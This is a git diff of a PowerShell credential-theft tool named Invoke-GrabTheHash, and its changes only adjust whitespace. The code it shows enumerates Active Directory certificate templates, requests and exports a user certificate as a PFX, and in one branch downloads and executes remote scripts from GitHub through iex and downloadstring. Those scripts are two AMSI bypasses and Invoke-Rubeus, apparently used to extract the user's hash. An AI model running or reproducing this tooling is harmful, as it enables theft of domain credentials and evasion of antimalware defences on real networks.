@@ -15,11 +15,11 @@ function Invoke-GrabTheHash
 		[String]$TemplateName = "User",
 		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
 		[string]$CAName,
-  		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
+		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
 		[string]$Domain,
-  		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
+		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
 		[string]$PFX,
-  		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
+		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
 		[switch]$CertTemplates
 	)
 	
@@ -34,27 +34,27 @@ function Invoke-GrabTheHash
 	else{
 
 		Write-Host "Domain switch not provided. Enumerating the Domain Name..."
-  		Write-Host ""
+		Write-Host ""
  
 		try{
-  			$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+			$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 			$currentDomain = $currentDomain.Name
-  		}
-    		catch{$currentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
+		}
+		catch{$currentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
 
 		Write-Host "Target Domain will be set to: $currentDomain"
-  		Write-Host ""
+		Write-Host ""
 	}
 
  	if($CertTemplates){
 
 		Write-Host "Certificate Templates:"
-  		Write-Host ""
+		Write-Host ""
 
-  		try{
-  
-	  		$domainDistinguishedName = "DC=" + ($currentDomain -replace "\.", ",DC=")
-	  		$ldapConnection = New-Object System.DirectoryServices.DirectoryEntry
+		try{
+
+			$domainDistinguishedName = "DC=" + ($currentDomain -replace "\.", ",DC=")
+			$ldapConnection = New-Object System.DirectoryServices.DirectoryEntry
 			$ldapConnection.Path = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$domainDistinguishedName"
 			$ldapConnection.AuthenticationType = "None"
 			
@@ -66,30 +66,30 @@ function Invoke-GrabTheHash
 			$results = $searcher.FindAll()
 			
 			$AllTemplates = foreach ($result in $results) {
-			    $templateName = $result.Properties["name"][0]
-			    Write-Host "$templateName"
+				$templateName = $result.Properties["name"][0]
+				Write-Host "$templateName"
 			}
 
-   			$AllTemplates | Sort
+			$AllTemplates | Sort
 			
 			# Dispose resources
 			$results.Dispose()
 			$searcher.Dispose()
 			$ldapConnection.Dispose()
-   		}
-
-     		catch{
-       			$AllTemplates = certutil -template
-	  		$AllTemplates -split "`n" | Where-Object { $_ -match 'TemplatePropCommonName' } | ForEach-Object { $_.Replace('TemplatePropCommonName = ', '').Trim() } | Sort
 		}
 
-  		Write-Host ""
+		catch{
+			$AllTemplates = certutil -template
+			$AllTemplates -split "`n" | Where-Object { $_ -match 'TemplatePropCommonName' } | ForEach-Object { $_.Replace('TemplatePropCommonName = ', '').Trim() } | Sort
+		}
 
-  		break
+		Write-Host ""
+
+		break
 	}
 
  	if($PFX){
-  		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
+		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
 		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
 		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
 		
@@ -101,7 +101,7 @@ function Invoke-GrabTheHash
 			Write-Host ""
 		}
 
-  		break
+		break
 	}
 	
 	if(!$CAName){
@@ -151,13 +151,13 @@ Exportable = TRUE
 RequestType = PKCS10
 [RequestAttributes]
 CertificateTemplate = "$TemplateName"
-"@        
+"@
 
 	Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
 	Set-Content .\certreq.inf $file
 	Get-Content .\certreq.inf | Write-Verbose
 
-	try    {
+	try {
 		Invoke-Expression -Command "certreq -new -q certreq.inf certreq.req" >$null 2>&1
 		if(!($LastExitCode -eq 0))
 		{
@@ -165,7 +165,7 @@ CertificateTemplate = "$TemplateName"
 			Write-Host ""
 			break
 		}
-	   
+
 		if($CAName){	
 			Invoke-Expression -Command "certreq -submit -q -config `"$CAName`" certreq.req $CN.cer" >$null 2>&1
 		}
@@ -211,7 +211,7 @@ CertificateTemplate = "$TemplateName"
 
 		$certbytes = $cert.export([System.Security.Cryptography.X509Certificates.X509ContentType]::pfx)
 
-		$certbytes | Set-Content -Encoding Byte  -Path "$CN.pfx" -ea Stop
+		$certbytes | Set-Content -Encoding Byte -Path "$CN.pfx" -ea Stop
 		Write-Host "Certificate successfully exported to $CN.pfx"
 		
 		$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'CurrentUser')
